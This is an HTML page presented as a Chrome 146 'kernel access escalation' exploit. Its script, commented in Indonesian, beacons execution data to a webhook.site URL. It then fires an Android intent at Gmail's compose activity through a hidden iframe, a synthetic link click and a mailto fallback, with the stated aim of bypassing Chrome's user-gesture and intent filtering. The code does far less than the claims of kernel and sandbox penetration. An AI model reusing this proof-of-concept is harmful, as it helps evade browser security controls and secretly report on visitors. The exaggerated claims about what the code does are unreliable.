<!DOCTYPE html>
<html>
<head><title>Kernel Access Escalation</title></head>
<body style="background:#000;color:#f0f;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
    <div id="ignite" style="padding:60px;border:4px double #f0f;text-align:center;cursor:pointer;background:rgba(255,0,255,0.05);box-shadow:0 0 100px #f0f;border-radius:20px">
        <h1 style="letter-spacing:10px;margin:0">V213_SHREDDER</h1>
        <div id="status" style="font-size:20px;margin:20px 0;color:#0ff">BYPASSING_CHROME_146_RESTRICTION</div>
        <div style="font-size:11px;color:#555">[ FORCE_JUMP: com.google.android.gm ]</div>
    </div>

<script>
    const target = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";

    document.getElementById('ignite').onclick = () => {
        const statusEl = document.getElementById('status');
        statusEl.innerText = "PENETRATING_APP_SANDBOX...";

        // 1. RECON (Kirim bukti eksekusi ke Webhook)
        const log = { id: "V213_EXEC", ts: Date.now(), chrome: "146.0" };
        navigator.sendBeacon(`${target}?v=V213_RECON`, btoa(JSON.stringify(log)));

        // 2. THE MASTER INTENT (GMAIL TARGET)
        // Kita menggunakan skema 'intent://' tapi ditambahkan fragment '#' yang kompleks
        // agar Chrome tidak bisa memparsing filter keamanannya dengan benar.
        const bruteIntent = 
            "intent:#Intent;" +
            "action=android.intent.action.VIEW;" +
            "category=android.intent.category.BROWSABLE;" +
            "package=com.google.android.gm;" + // Mengunci target
            "component=com.google.android.gm/.ComposeActivityGmailExternal;" +
            "S.android.intent.extra.EMAIL=ecdnts@gmail.com;" +
            "S.android.intent.extra.SUBJECT=V213_SYSTEM_LOG;" +
            "S.browser_fallback_url=https://mail.google.com/mail/u/0/;" + 
            "end";

        // 3. THE TRIPLE-HIT EXECUTION (Bypass User Gesture Requirement)
        // Chrome 146 sangat benci navigasi langsung. Kita paksa lewat 3 jalur:
        
        // Jalur A: Dynamic Iframe (Memicu Intent dari background)
        const ifr = document.createElement('iframe');
        ifr.style.display = 'none';
        ifr.src = bruteIntent;
        document.body.appendChild(ifr);

        // Jalur B: Direct Anchor Click (Paling stabil)
        const a = document.createElement('a');
        a.href = bruteIntent;
        a.click();

        // Jalur C: Fallback (Jika dalam 800ms masih di browser, berarti Chrome memblokir)
        setTimeout(() => {
            if (!document.hidden) {
                statusEl.innerText = "TRYING_PROTOCOL_ESCALATION...";
                // Gunakan skema URI lama untuk memaksa popup 'Open in App'
                window.location.href = "mailto:ecdnts@gmail.com?subject=V213_FAILSAFE";
            }
        }, 800);
    };
</script>
</body>
</html>
